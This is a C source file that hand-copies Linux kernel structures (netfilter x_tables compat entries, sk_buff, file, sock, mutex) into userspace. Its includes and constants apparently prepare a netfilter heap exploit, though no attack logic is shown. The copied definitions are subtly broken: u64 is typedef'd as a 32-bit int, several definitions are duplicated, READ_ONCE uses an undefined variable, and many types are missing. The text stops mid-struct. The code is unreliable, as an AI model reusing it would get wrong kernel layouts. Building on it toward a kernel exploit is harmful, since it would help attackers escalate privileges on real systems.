#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#include <sys/syscall.h>
#include <linux/netfilter_ipv4/ip_tables.h>

#include <asm/types.h>

#include <stdbool.h>

#include <asm-generic/int-ll64.h>

//


#define PRIMARY_SIZE 0x1000

#ifndef __user
#define __user
#endif

#define CAP_NET_ADMIN        12

typedef unsigned int u32;
typedef unsigned int u64;
typedef signed char s8;
typedef unsigned char u8;

typedef signed short s16;
typedef unsigned short u16;

typedef signed int s32;
typedef unsigned int u32;

typedef signed long long s64;

typedef u32		compat_uptr_t;
typedef u64		compat_u64;
typedef u32		compat_uint_t;
#define __user
#define __aligned(x)		__attribute__((aligned(x)))

#define __ARG_PLACEHOLDER_1 0,
#define config_enabled(cfg) _config_enabled(cfg)
#define _config_enabled(value) __config_enabled(__ARG_PLACEHOLDER_##value)
#define __config_enabled(arg1_or_junk) ___config_enabled(arg1_or_junk 1, 0)
#define ___config_enabled(__ignored, val, ...) val

/*
 * Maximum supported processors.  Setting this smaller saves quite a
 * bit of memory.  Use nr_cpu_ids instead of this except for static bitmaps.
 */
#ifndef CONFIG_NR_CPUS
/* FIXME: This should be fixed in the arch's Kconfig */
#define CONFIG_NR_CPUS	1
#endif
/* Places which use this should consider cpumask_var_t. */
#define NR_CPUS		CONFIG_NR_CPUS
#if NR_CPUS == 1
#define nr_cpu_ids		1
#else
extern int nr_cpu_ids;
#endif

# define __percpu

#define COMPAT_XT_ALIGN(s) __ALIGN_KERNEL((s), __alignof__(struct _compat_xt_align))
#define __aligned(x)		__attribute__((aligned(x)))


extern unsigned long totalram_pages;
#define PAGE_SHIFT	12

#define __GFP_RECLAIM ((__force gfp_t)(___GFP_DIRECT_RECLAIM|___GFP_KSWAPD_RECLAIM))
/**
 * @brief 
 * could not find the correct definition to this __XTENSA_UL_CONST(1)
 */
#define __XTENSA_UL (x)	((unsigned long)(x))
#define __XTENSA_UL_CONST(x)   x##UL
#define PAGE_SIZE	(__XTENSA_UL_CONST(1) << PAGE_SHIFT)
#define PAGE_ALLOC_COSTLY_ORDER 3
#define GFP_KERNEL	(__GFP_RECLAIM | __GFP_IO | __GFP_FS)

#define FUTEX_WAIT		0
#define FUTEX_WAKE		1

#define GFP_KERNEL	(__GFP_RECLAIM | __GFP_IO | __GFP_FS)

#define FWINV(bool, invflg) ((bool) ^ !!(arpinfo->invflags & (invflg)))


#if BITS_PER_LONG > 32
#define NET_SKBUFF_DATA_USES_OFFSET 1
#endif

/* Not standard, but glibc defines it */
#define BITS_PER_LONG __WORDSIZE

#ifdef NET_SKBUFF_DATA_USES_OFFSET
typedef unsigned int sk_buff_data_t;
#else
typedef unsigned char *sk_buff_data_t;
#endif

#define L1_CACHE_SHIFT	XCHAL_DCACHE_LINEWIDTH
#define L1_CACHE_BYTES	XCHAL_DCACHE_LINESIZE
#define SMP_CACHE_BYTES	L1_CACHE_BYTES
#define SMP_ALIGN(x) (((x) + SMP_CACHE_BYTES-1) & ~(SMP_CACHE_BYTES-1))


static struct xt_af *xt;

#define __must_check
#define __force

#define MAX_ERRNO	4095
#ifndef likely
# define likely(x)		__builtin_expect(!!(x), 1)
#endif

#ifndef unlikely
# define unlikely(x)		__builtin_expect(!!(x), 0)
#endif
#define IS_ERR_VALUE(x) unlikely((x) >= (unsigned long)-MAX_ERRNO)

#define _RET_IP_		(unsigned long)__builtin_return_address(0)

#define num_possible_cpus()	1U

#define XCHAL_ICACHE_LINESIZE		32	/* I-cache line size in bytes */
#define XCHAL_DCACHE_LINESIZE		32	/* D-cache line size in bytes */
#define XCHAL_ICACHE_LINEWIDTH		5	/* log2(I line size in bytes) */
#define XCHAL_DCACHE_LINEWIDTH		5	/* log2(D line size in bytes) */

#define L1_CACHE_SHIFT	XCHAL_DCACHE_LINEWIDTH
#define L1_CACHE_BYTES	XCHAL_DCACHE_LINESIZE
#define SMP_CACHE_BYTES	L1_CACHE_BYTES

#ifndef __attribute__
#define __attribute__(x)
#endif

#ifndef ____cacheline_aligned
#define ____cacheline_aligned __attribute__((__aligned__(SMP_CACHE_BYTES)))
#endif

#define kmemcheck_bitfield_begin(name)
#define kmemcheck_bitfield_end(name)
#define CONFIG_SMP
#ifndef ____cacheline_aligned_in_smp
#ifdef CONFIG_SMP
#define ____cacheline_aligned_in_smp ____cacheline_aligned
#else
#define ____cacheline_aligned_in_smp
#endif /* CONFIG_SMP */
#endif

/* File is opened with O_PATH; almost nothing can be done with it */
#define FMODE_PATH		((__force fmode_t)0x4000)

#define WRITE_ONCE(var, val) \
	(*((volatile typeof(val) *)(&(var))) = (val))
#define READ_ONCE(var) (*((volatile typeof(val) *)(&(var))))

#define atomic_read(v)	READ_ONCE((v)->counter)
#define atomic_set(v,i)	WRITE_ONCE(((v)->counter), (i))

#define FDPUT_FPUT       1
#define FDPUT_POS_UNLOCK 2



#define __ARG_PLACEHOLDER_1 0,
#define config_enabled(cfg) _config_enabled(cfg)
#define _config_enabled(value) __config_enabled(__ARG_PLACEHOLDER_##value)
#define __config_enabled(arg1_or_junk) ___config_enabled(arg1_or_junk 1, 0)
#define ___config_enabled(__ignored, val, ...) val

/*
 * IS_BUILTIN(CONFIG_FOO) evaluates to 1 if CONFIG_FOO is set to 'y', 0
 * otherwise. For boolean options, this is equivalent to
 * IS_ENABLED(CONFIG_FOO).
 */
#define IS_BUILTIN(option) config_enabled(option)

/*
 * IS_MODULE(CONFIG_FOO) evaluates to 1 if CONFIG_FOO is set to 'm', 0
 * otherwise.
 */
#define IS_MODULE(option) config_enabled(option##_MODULE)

/*
 * IS_ENABLED(CONFIG_FOO) evaluates to 1 if CONFIG_FOO is set to 'y' or 'm',
 * 0 otherwise.
 */
#define IS_ENABLED(option) \
	(IS_BUILTIN(option) || IS_MODULE(option))




#define RCU_LOCKDEP_WARN(c, s) do { } while (0)
#define rcu_sleep_check() do { } while (0)

#ifdef __CHECKER__
#define rcu_dereference_sparse(p, space) \
	((void)(((typeof(*p) space *)p) == p))
#else /* #ifdef __CHECKER__ */
#define rcu_dereference_sparse(p, space)
#endif /* #else #ifdef __CHECKER__ */

#ifndef smp_read_barrier_depends
#define smp_read_barrier_depends()	do { } while (0)
#endif

/**
 * lockless_dereference() - safely load a pointer for later dereference
 * @p: The pointer to load
 *
 * Similar to rcu_dereference(), but for situations where the pointed-to
 * object's lifetime is managed by something other than RCU.  That
 * "something other" might be reference counting or simple immortality.
 */
#define lockless_dereference(p) \
({ \
	typeof(p) _________p1 = READ_ONCE(p); \
	smp_read_barrier_depends(); /* Dependency order vs. p above. */ \
	(_________p1); \
})

#define __rcu_dereference_check(p, c, space) \
({ \
	/* Dependency order vs. p above. */ \
	typeof(*p) *________p1 = (typeof(*p) *__force)lockless_dereference(p); \
	RCU_LOCKDEP_WARN(!(c), "suspicious rcu_dereference_check() usage"); \
	rcu_dereference_sparse(p, space); \
	((typeof(*p) __force __kernel *)(________p1)); \
})

#define rcu_dereference_check(p, c) \
	__rcu_dereference_check((p), (c) || rcu_read_lock_held(), __rcu)

#define rcu_dereference_raw(p) rcu_dereference_check(p, 1) /*@@@ needed? @@@*/


#ifdef __CHECKER__
#define __bitwise__ __attribute__((bitwise))
#else
#define __bitwise__
#endif

#define try_then_request_module(x, mod...) (x)

/* Attach to any functions which should be ignored in wchan output. */
#define __sched		__attribute__((__section__(".sched.text")))

typedef unsigned __bitwise__ fmode_t;

typedef unsigned __bitwise__ gfp_t;

#define	NUMA_NO_NODE	(-1)

#define ___GFP_DIRECT_RECLAIM	0x400000u
#define ___GFP_KSWAPD_RECLAIM	0x2000000u
#define ___GFP_IO		0x40u
#define ___GFP_FS		0x80u
#define ___GFP_HIGHMEM		0x02u
#define ___GFP_ZERO		0x8000u

#define __GFP_IO	((__force gfp_t)___GFP_IO)
#define __GFP_FS	((__force gfp_t)___GFP_FS)
#define __GFP_RECLAIM ((__force gfp_t)(___GFP_DIRECT_RECLAIM|___GFP_KSWAPD_RECLAIM))

#define GFP_KERNEL	(__GFP_RECLAIM | __GFP_IO | __GFP_FS)

#define __GFP_HIGHMEM	((__force gfp_t)___GFP_HIGHMEM)
#define __GFP_ZERO	((__force gfp_t)___GFP_ZERO)

#define __pgprot(x)	((pgprot_t) { (x) } )

typedef struct { unsigned long pgprot; } pgprot_t;

/* Software bits in the page table entry */
#define _PAGE_PRESENT	0x001		/* SW pte present bit */
#define _PAGE_YOUNG	0x004		/* SW pte young bit */
#define _PAGE_DIRTY	0x008		/* SW pte dirty bit */
#define _PAGE_READ	0x010		/* SW pte read bit */
#define _PAGE_WRITE	0x020		/* SW pte write bit */
#define _PAGE_SPECIAL	0x040		/* SW associated with special page */
#define _PAGE_UNUSED	0x080		/* SW bit for pgste usage state */
#define __HAVE_ARCH_PTE_SPECIAL

#define PAGE_KERNEL	__pgprot(_PAGE_PRESENT | _PAGE_READ | _PAGE_WRITE | \
				 _PAGE_YOUNG | _PAGE_DIRTY)


/* Don't assign or return these: may not be this big! */
//typedef struct cpumask { DECLARE_BITMAP(bits, NR_CPUS); } cpumask_t;

extern struct cpumask __cpu_possible_mask;
#define cpu_possible_mask ((const struct cpumask *)&__cpu_possible_mask)

#define for_each_cpu(cpu, mask)			\
	for ((cpu) = 0; (cpu) < 1; (cpu)++, (void)mask)

#define for_each_possible_cpu(cpu) for_each_cpu((cpu), cpu_possible_mask)


static inline void barrier(void)
{
	asm volatile("" : : : "memory");
}

#define smp_wmb()	barrier()

extern void __local_bh_enable_ip(unsigned long ip, unsigned int cnt);

#define PREEMPT_SHIFT	0
#define PREEMPT_BITS	8
#define SOFTIRQ_SHIFT	(PREEMPT_SHIFT + PREEMPT_BITS)
#define SOFTIRQ_OFFSET	(1UL << SOFTIRQ_SHIFT)
#define SOFTIRQ_DISABLE_OFFSET	(2 * SOFTIRQ_OFFSET)

#define _THIS_IP_  ({ __label__ __here; __here: (unsigned long)&&__here; })


static inline void local_bh_enable(void)
{
	__local_bh_enable_ip(_THIS_IP_, SOFTIRQ_DISABLE_OFFSET);
}

#define call_int_hook(FUNC, IRC, ...) ({			\
	int RC = IRC;						\
	do {							\
		struct security_hook_list *P;			\
								\
		list_for_each_entry(P, &security_hook_heads.FUNC, list) { \
			RC = P->hook.FUNC(__VA_ARGS__);		\
			if (RC != 0)				\
				break;				\
		}						\
	} while (0);						\
	RC;							\
})

///////////////////////////////////// STRUCTS ///////////////////////////////////
typedef struct seqcount {
	unsigned sequence;
#ifdef CONFIG_DEBUG_LOCK_ALLOC
	struct lockdep_map dep_map;
#endif
} seqcount_t;

struct _compat_xt_align {
	__u8 u8;
	__u16 u16;
	__u32 u32;
	compat_u64 u64;
};// struct _compat_xt_align

static const char *const xt_prefix[NFPROTO_NUMPROTO] = {
	[NFPROTO_UNSPEC] = "x",
	[NFPROTO_IPV4]   = "ip",
	[NFPROTO_ARP]    = "arp",
	[NFPROTO_BRIDGE] = "eb",
	[NFPROTO_IPV6]   = "ip6",
};

struct compat_xt_counters {
	compat_u64 pcnt, bcnt;			/* Packet and byte counters */
};// struct compat_xt_counters

struct compat_ipt_entry {
	struct ipt_ip ip;
	compat_uint_t nfcache;
	__u16 target_offset;
	__u16 next_offset;
	compat_uint_t comefrom;
	struct compat_xt_counters counters;
	unsigned char elems[0];
};// struct compat_ipt_entry

struct compat_ipt_replace {
	char			name[XT_TABLE_MAXNAMELEN];
	u32			valid_hooks;
	u32			num_entries;
	u32			size;
	u32			hook_entry[NF_INET_NUMHOOKS];
	u32			underflow[NF_INET_NUMHOOKS];
	u32			num_counters;
	compat_uptr_t		counters;	/* struct xt_counters * */
	struct compat_ipt_entry	entries[0];
};// struct compat_ipt_replace

/* The table itself */
struct xt_table_info {
	/* Size per table */
	unsigned int size;
	/* Number of entries: FIXME. --RR */
	unsigned int number;
	/* Initial number of entries. Needed for module usage count */
	unsigned int initial_entries;

	/* Entry points and underflows */
	unsigned int hook_entry[NF_INET_NUMHOOKS];
	unsigned int underflow[NF_INET_NUMHOOKS];

	/*
	 * Number of user chains. Since tables cannot have loops, at most
	 * @stacksize jumps (number of user chains) can possibly be made.
	 */
	unsigned int stacksize;
	void ***jumpstack;

	unsigned char entries[0] __aligned(8);
};// struct xt_table_info 

struct list_head {
	struct list_head *next, *prev;
};// struct list_head 

/* Furniture shopping... */
struct xt_table {
	struct list_head list;

	/* What hooks you will enter on */
	unsigned int valid_hooks;

	/* Man behind the curtain... */
	struct xt_table_info *private;

	/* Set this to THIS_MODULE if you are a module, otherwise NULL */
	struct module *me;

	u_int8_t af;		/* address/protocol family */
	int priority;		/* hook order */

	/* called when table is needed in the given netns */
	int (*table_init)(struct net *net);

	/* A unique name... */
	const char name[XT_TABLE_MAXNAMELEN];
};// struct xt_table

/* Registration hooks for targets. */
struct xt_target {
	struct list_head list;

	const char name[XT_EXTENSION_MAXNAMELEN];
	u_int8_t revision;

	/* Returns verdict. Argument order changed since 2.6.9, as this
	   must now handle non-linear skbs, using skb_copy_bits and
	   skb_ip_make_writable. */
	unsigned int (*target)(struct sk_buff *skb,
			       const struct xt_action_param *);

	/* Called when user tries to insert an entry of this type:
           hook_mask is a bitmask of hooks from which it can be
           called. */
	/* Should return 0 on success or an error code otherwise (-Exxxx). */
	int (*checkentry)(const struct xt_tgchk_param *);

	/* Called when entry of this type deleted. */
	void (*destroy)(const struct xt_tgdtor_param *);
/* #ifdef CONFIG_COMPAT */
	/* Called when userspace align differs from kernel space one */
	void (*compat_from_user)(void *dst, const void *src);
	int (*compat_to_user)(void __user *dst, const void *src);
/* #endif */
	/* Set this to THIS_MODULE if you are a module, otherwise NULL */
	struct module *me;

	const char *table;
	unsigned int targetsize;
/* #ifdef CONFIG_COMPAT */
	unsigned int compatsize;
/* #endif */
	unsigned int hooks;
	unsigned short proto;

	unsigned short family;
};// struct xt_target

struct compat_xt_entry_target {
	union {
		struct {
			u_int16_t target_size;
			char name[XT_FUNCTION_MAXNAMELEN - 1];
			u_int8_t revision;
		} user;
		struct {
			u_int16_t target_size;
			compat_uptr_t target;
		} kernel;
		u_int16_t target_size;
	} u;
	unsigned char data[0];
};// struct compat_xt_entry_target

struct compat_xt_entry_match {
	union {
		struct {
			u_int16_t match_size;
			char name[XT_FUNCTION_MAXNAMELEN - 1];
			u_int8_t revision;
		} user;
		struct {
			u_int16_t match_size;
			compat_uptr_t match;
		} kernel;
		u_int16_t match_size;
	} u;
	unsigned char data[0];
};// struct compat_xt_entry_match

/*
 * ktime_t:
 *
 * A single 64-bit variable is used to store the hrtimers
 * internal representation of time values in scalar nanoseconds. The
 * design plays out best on 64-bit CPUs, where most conversions are
 * NOPs and most arithmetic ktime_t operations are plain arithmetic
 * operations.
 *
 */
union ktime {
	s64	tv64;
};// union ktime

typedef union ktime ktime_t;		/* Kill this */

/**
 * struct skb_mstamp - multi resolution time stamps
 * @stamp_us: timestamp in us resolution
 * @stamp_jiffies: timestamp in jiffies
 */
struct skb_mstamp {
	union {
		u64		v64;
		struct {
			u32	stamp_us;
			u32	stamp_jiffies;
		};
	};
};// struct skb_mstamp 

struct rb_node {
	unsigned long  __rb_parent_color;
	struct rb_node *rb_right;
	struct rb_node *rb_left;
} __attribute__((aligned(sizeof(long))));
    /* The alignment might seem pointless, but allegedly CRIS needs it */

struct rb_root {
	struct rb_node *rb_node;
};// struct rb_root

#if defined(CONFIG_NF_CONNTRACK) || defined(CONFIG_NF_CONNTRACK_MODULE)
struct nf_conntrack {
	atomic_t use;
};
#endif

typedef struct {
	int counter;
} atomic_t;

/* Add comment to describe elements */
struct sk_buff {
	union {
		struct {
			/* These two members must be first. */
			struct sk_buff		*next;
			struct sk_buff		*prev;

			union {
				ktime_t		tstamp;
				struct skb_mstamp skb_mstamp;
			};
		};
		struct rb_node	rbnode; /* used in netem & tcp stack */
	};
	struct sock		*sk;
	struct net_device	*dev;

	/*
	 * This is the control buffer. It is free to use for every
	 * layer. Please put your private variables there. If you
	 * want to keep them across layers you have to do a skb_clone()
	 * first. This is owned by whoever has the skb queued ATM.
	 */
	char			cb[48] __aligned(8);

	unsigned long		_skb_refdst;
	void			(*destructor)(struct sk_buff *skb);
	/** Unable to find the definition */	
	/*
	#ifdef CONFIG_XFRM
		struct	sec_path	*sp;
	#endif

	#if defined(CONFIG_NF_CONNTRACK) || defined(CONFIG_NF_CONNTRACK_MODULE)
		struct nf_conntrack	*nfct;
	#endif
	#if IS_ENABLED(CONFIG_BRIDGE_NETFILTER)
		struct nf_bridge_info	*nf_bridge;
	#endif
	*/
		unsigned int		len,
					data_len;
		__u16			mac_len,
					hdr_len;

		/* Following fields are _not_ copied in __copy_skb_header()
		* Note that queue_mapping is here mostly to fill a hole.
		*/
	//unable to get the definition
	/*
		kmemcheck_bitfield_begin(flags1);
		__u16			queue_mapping;
		__u8			cloned:1,
					nohdr:1,
					fclone:2,
					peeked:1,
					head_frag:1,
					xmit_more:1;
		/* one bit hole *//*
		kmemcheck_bitfield_end(flags1);
	*/

		/* fields enclosed in headers_start/headers_end are copied
		* using a single memcpy() in __copy_skb_header()
		*/
		/* private: */
		__u32			headers_start[0];
		/* public: */

	/* if you move pkt_type around you also must adapt those constants */
	#ifdef __BIG_ENDIAN_BITFIELD
	#define PKT_TYPE_MAX	(7 << 5)
	#else
	#define PKT_TYPE_MAX	7
	#endif
	#define PKT_TYPE_OFFSET()	offsetof(struct sk_buff, __pkt_type_offset)

		__u8			__pkt_type_offset[0];
		__u8			pkt_type:3;
		__u8			pfmemalloc:1;
		__u8			ignore_df:1;
		__u8			nfctinfo:3;

		__u8			nf_trace:1;
		__u8			ip_summed:2;
		__u8			ooo_okay:1;
		__u8			l4_hash:1;
		__u8			sw_hash:1;
		__u8			wifi_acked_valid:1;
		__u8			wifi_acked:1;

		__u8			no_fcs:1;
		/* Indicates the inner headers are valid in the skbuff. */
		__u8			encapsulation:1;
		__u8			encap_hdr_csum:1;
		__u8			csum_valid:1;
		__u8			csum_complete_sw:1;
		__u8			csum_level:2;
		__u8			csum_bad:1;

	#ifdef CONFIG_IPV6_NDISC_NODETYPE
		__u8			ndisc_nodetype:2;
	#endif
		__u8			ipvs_property:1;
		__u8			inner_protocol_type:1;
		__u8			remcsum_offload:1;
		/* 3 or 5 bit hole */

	#ifdef CONFIG_NET_SCHED
		__u16			tc_index;	/* traffic control index */
	#ifdef CONFIG_NET_CLS_ACT
		__u16			tc_verd;	/* traffic control verdict */
	#endif
	#endif

		union {
			__wsum		csum;
			struct {
				__u16	csum_start;
				__u16	csum_offset;
			};
		};
		__u32			priority;
		int			skb_iif;
		__u32			hash;
		__be16			vlan_proto;
		__u16			vlan_tci;
	#if defined(CONFIG_NET_RX_BUSY_POLL) || defined(CONFIG_XPS)
		union {
			unsigned int	napi_id;
			unsigned int	sender_cpu;
		};
	#endif
		union {
	#ifdef CONFIG_NETWORK_SECMARK
			__u32		secmark;
	#endif
	#ifdef CONFIG_NET_SWITCHDEV
			__u32		offload_fwd_mark;
	#endif
		};

		union {
			__u32		mark;
			__u32		reserved_tailroom;
		};

		union {
			__be16		inner_protocol;
			__u8		inner_ipproto;
		};

		__u16			inner_transport_header;
		__u16			inner_network_header;
		__u16			inner_mac_header;

		__be16			protocol;
		__u16			transport_header;
		__u16			network_header;
		__u16			mac_header;

		/* private: */
		__u32			headers_end[0];
		/* public: */

		/* These elements must be at the end, see alloc_skb() for details.  */
		sk_buff_data_t		tail;
		sk_buff_data_t		end;
		unsigned char		*head,
					*data;
		unsigned int		truesize;
		atomic_t		users;
}; //struct sk_buff 

struct xt_match {
	struct list_head list;

	const char name[XT_EXTENSION_MAXNAMELEN];
	u_int8_t revision;

	/* Return true or false: return FALSE and set *hotdrop = 1 to
           force immediate packet drop. */
	/* Arguments changed since 2.6.9, as this must now handle
	   non-linear skb, using skb_header_pointer and
	   skb_ip_make_writable. */
	bool (*match)(const struct sk_buff *skb,
		      struct xt_action_param *);


	/* Called when user tries to insert an entry of this type. */
	int (*checkentry)(const struct xt_mtchk_param *);

	/* Called when entry of this type deleted. */
	void (*destroy)(const struct xt_mtdtor_param *);

	/* unable to find CONFIG_COMPAT */
	//#ifdef CONFIG_COMPAT
		/* Called when userspace align differs from kernel space one */
		void (*compat_from_user)(void *dst, const void *src);
		int (*compat_to_user)(void __user *dst, const void *src);
	//#endif
		/* Set this to THIS_MODULE if you are a module, otherwise NULL */
		struct module *me;

		const char *table;
		unsigned int matchsize;

	//unable to define CONFIG_COMPAT
	//#ifdef CONFIG_COMPAT
		unsigned int compatsize;
	//#endif
		unsigned int hooks;
		unsigned short proto;

		unsigned short family;
	};// struct xt_match


	struct compat_delta {
		unsigned int offset; /* offset in kernel */
		int delta; /* delta in 32bit user land */
};// struct compat_delta


#ifdef CONFIG_DEBUG_SPINLOCK

	typedef struct {
		volatile unsigned int slock;
	} arch_spinlock_t;

	#define __ARCH_SPIN_LOCK_UNLOCKED { 1 }

	#else

	typedef struct { } arch_spinlock_t;

	#define __ARCH_SPIN_LOCK_UNLOCKED { }

#endif

typedef struct raw_spinlock {
	arch_spinlock_t raw_lock;
	#ifdef CONFIG_GENERIC_LOCKBREAK
		unsigned int break_lock;
	#endif
	#ifdef CONFIG_DEBUG_SPINLOCK
		unsigned int magic, owner_cpu;
		void *owner;
	#endif
	#ifdef CONFIG_DEBUG_LOCK_ALLOC
		struct lockdep_map dep_map;
	#endif
} raw_spinlock_t;

typedef struct spinlock {
	union {
		struct raw_spinlock rlock;

#ifdef CONFIG_DEBUG_LOCK_ALLOC
# define LOCK_PADSIZE (offsetof(struct raw_spinlock, dep_map))
		struct {
			u8 __padding[LOCK_PADSIZE];
			struct lockdep_map dep_map;
		};
#endif
	};
} spinlock_t;

struct mutex {
	/* 1: unlocked, 0: locked, negative: locked, possible waiters */
	atomic_t		count;
	spinlock_t		wait_lock;
	struct list_head	wait_list;
	#if defined(CONFIG_DEBUG_MUTEXES) || defined(CONFIG_MUTEX_SPIN_ON_OWNER)
		struct task_struct	*owner;
	#endif
	#ifdef CONFIG_MUTEX_SPIN_ON_OWNER
		struct optimistic_spin_queue osq; /* Spinner MCS lock */
	#endif
	#ifdef CONFIG_DEBUG_MUTEXES
		void			*magic;
	#endif
	#ifdef CONFIG_DEBUG_LOCK_ALLOC
		struct lockdep_map	dep_map;
	#endif
};// struct mutex

struct xt_af {
	struct mutex mutex;
	struct list_head match;
	struct list_head target;
	//unable to find the definition of CONFIG_COMPAT
	//#ifdef CONFIG_COMPAT
		struct mutex compat_mutex;
		struct compat_delta *compat_tab;
		unsigned int number; /* number of slots in compat_tab[] */
		unsigned int cur; /* number of used slots in compat_tab[] */
	//#endif
};// struct xt_af

struct __wait_queue_head {
	spinlock_t		lock;
	struct list_head	task_list;
};// struct __wait_queue_head
typedef struct __wait_queue_head wait_queue_head_t;

/**
 * @brief unable to find the definition
 * 
 */
struct rcu_head
{
	/* data */
};// struct rcu_head


struct file {
	union {
		struct llist_node	fu_llist;
		struct rcu_head 	fu_rcuhead;
	} f_u;
	struct path		f_path;
	struct inode		*f_inode;	/* cached value */
	const struct file_operations	*f_op;

	/*
	 * Protects f_ep_links, f_flags.
	 * Must not be taken from IRQ context.
	 */
	spinlock_t		f_lock;
	atomic_long_t		f_count;
	unsigned int 		f_flags;
	fmode_t			f_mode;
	struct mutex		f_pos_lock;
	loff_t			f_pos;
	struct fown_struct	f_owner;
	const struct cred	*f_cred;
	struct file_ra_state	f_ra;

	u64			f_version;
#ifdef CONFIG_SECURITY
	void			*f_security;
#endif
	/* needed for tty driver, and maybe others */
	void			*private_data;

#ifdef CONFIG_EPOLL
	/* Used by fs/eventpoll.c to link all the hooks to this file */
	struct list_head	f_ep_links;
	struct list_head	f_tfile_llink;
#endif /* #ifdef CONFIG_EPOLL */
	struct address_space	*f_mapping;
} __attribute__((aligned(4)));	/* lest something weird decides that 2 is OK */


struct fd {
	struct file *file;
	unsigned int flags;
};// struct fd

struct fasync_struct {
	spinlock_t		fa_lock;
	int			magic;
	int			fa_fd;
	struct fasync_struct	*fa_next; /* singly linked list */
	struct file		*fa_file;
	struct rcu_head		fa_rcu;
};// struct fasync_struct

struct socket_wq {
	/* Note: wait MUST be first field of socket_wq */
	wait_queue_head_t	wait;
	struct fasync_struct	*fasync_list;
	unsigned long		flags; /* %SOCKWQ_ASYNC_NOSPACE, etc */
	struct rcu_head		rcu;
} ____cacheline_aligned_in_smp;


struct sk_buff_head {
	/* These two members must be first. */
	struct sk_buff	*next;
	struct sk_buff	*prev;

	__u32		qlen;
	spinlock_t	lock;
};// struct sk_buff_head

# define __rcu

/**
 * @brief system property
 * 
 */
struct sk_filter{
};

/**
 * @brief unable to get the definition. system call
 * 
 */
struct xfrm_policy{
	};

typedef __u32 __bitwise __portpair;
typedef __u64 __bitwise __addrpair;

struct hlist_head {
	struct hlist_node *first;
};// struct hlist_head

struct hlist_node {
	struct hlist_node *next, **pprev;
};// struct hlist_node

struct hlist_nulls_head {
	struct hlist_nulls_node *first;
};// struct hlist_nulls_head

struct hlist_nulls_node {
	struct hlist_nulls_node *next, **pprev;
};// struct hlist_nulls_node

typedef atomic_t atomic_long_t;

/**
 * @brief redefinition
 * 
 */
/* Structure describing a generic socket address.  */
//struct sockaddr
 // {
//    __SOCKADDR_COMMON (sa_);	/* Common data: address family and length.  */
//    char sa_data[14];		/* Address data.  */
 // };

/* Networking protocol blocks we attach to sockets.
 * socket layer -> transport layer interface
 */
struct proto {
	void			(*close)(struct sock *sk,
					long timeout);
	int			(*connect)(struct sock *sk,
					struct sockaddr *uaddr,
					int addr_len);
	int			(*disconnect)(struct sock *sk, int flags);

	struct sock *		(*accept)(struct sock *sk, int flags, int *err);

	int			(*ioctl)(struct sock *sk, int cmd,
					 unsigned long arg);
	int			(*init)(struct sock *sk);
	void			(*destroy)(struct sock *sk);
	void			(*shutdown)(struct sock *sk, int how);
	int			(*setsockopt)(struct sock *sk, int level,
					int optname, char __user *optval,
					unsigned int optlen);
	int			(*getsockopt)(struct sock *sk, int level,
					int optname, char __user *optval,
					int __user *option);
	#ifdef CONFIG_COMPAT
		int			(*compat_setsockopt)(struct sock *sk,
						int level,
						int optname, char __user *optval,
						unsigned int optlen);
		int			(*compat_getsockopt)(struct sock *sk,
						int level,
						int optname, char __user *optval,
						int __user *option);
		int			(*compat_ioctl)(struct sock *sk,
						unsigned int cmd, unsigned long arg);
	#endif
		int			(*sendmsg)(struct sock *sk, struct msghdr *msg,
						size_t len);
		int			(*recvmsg)(struct sock *sk, struct msghdr *msg,
						size_t len, int noblock, int flags,
						int *addr_len);
		int			(*sendpage)(struct sock *sk, struct page *page,
						int offset, size_t size, int flags);
		int			(*bind)(struct sock *sk,
						struct sockaddr *uaddr, int addr_len);

		int			(*backlog_rcv) (struct sock *sk,
							struct sk_buff *skb);

		void		(*release_cb)(struct sock *sk);

		/* Keeping track of sk's, looking them up, and port selection methods. */
		int			(*hash)(struct sock *sk);
		void			(*unhash)(struct sock *sk);
		void			(*rehash)(struct sock *sk);
		int			(*get_port)(struct sock *sk, unsigned short snum);
		void			(*clear_sk)(struct sock *sk, int size);

		/* Keeping track of sockets in use */
	#ifdef CONFIG_PROC_FS
		unsigned int		inuse_idx;
	#endif

		bool			(*stream_memory_free)(const struct sock *sk);
		/* Memory pressure */
		void			(*enter_memory_pressure)(struct sock *sk);
		atomic_long_t		*memory_allocated;	/* Current allocated memory. */
		struct percpu_counter	*sockets_allocated;	/* Current number of sockets. */
		/*
		* Pressure flag: try to collapse.
		* Technical note: it is used by multiple contexts non atomically.
		* All the __sk_mem_schedule() is of this nature: accounting
		* is strict, actions are advisory and have some latency.
		*/
		int			*memory_pressure;
		long			*sysctl_mem;
		int			*sysctl_wmem;
		int			*sysctl_rmem;
		int			max_header;
		bool			no_autobind;

		struct kmem_cache	*slab;
		unsigned int		obj_size;
		int			slab_flags;

		struct percpu_counter	*orphan_count;

		struct request_sock_ops	*rsk_prot;
		struct timewait_sock_ops *twsk_prot;

		union {
			struct inet_hashinfo	*hashinfo;
			struct udp_table	*udp_table;
			struct raw_hashinfo	*raw_hash;
		} h;

		struct module		*owner;

		char			name[32];

		struct list_head	node;
	#ifdef SOCK_REFCNT_DEBUG
		atomic_t		socks;
	#endif
		int			(*diag_destroy)(struct sock *sk, int err);
}; // struct proto

typedef struct {
//#ifdef CONFIG_NET_NS
	struct net *net;
//#endif
} possible_net_t;

typedef struct {
	long counter;
} atomic64_t;

struct inet_hashinfo;

struct inet_timewait_death_row {
	atomic_t		tw_count;

	struct inet_hashinfo 	*hashinfo ____cacheline_aligned_in_smp;
	int			sysctl_tw_recycle;
	int			sysctl_max_tw_buckets;
};// struct inet_timewait_death_row


struct sock_common {
	/* skc_daddr and skc_rcv_saddr must be grouped on a 8 bytes aligned
	 * address on 64bit arches : cf INET_MATCH()
	 */
	union {
		__addrpair	skc_addrpair;
		struct {
			__be32	skc_daddr;
			__be32	skc_rcv_saddr;
		};
	};
	union  {
		unsigned int	skc_hash;
		__u16		skc_u16hashes[2];
	};
	/* skc_dport && skc_num must be grouped as well */
	union {
		__portpair	skc_portpair;
		struct {
			__be16	skc_dport;
			__u16	skc_num;
		};
	};

	unsigned short		skc_family;
	volatile unsigned char	skc_state;
	unsigned char		skc_reuse:4;
	unsigned char		skc_reuseport:1;
	unsigned char		skc_ipv6only:1;
	unsigned char		skc_net_refcnt:1;
	int			skc_bound_dev_if;
	union {
		struct hlist_node	skc_bind_node;
		struct hlist_nulls_node skc_portaddr_node;
	};
	struct proto		*skc_prot; 
	possible_net_t		skc_net;

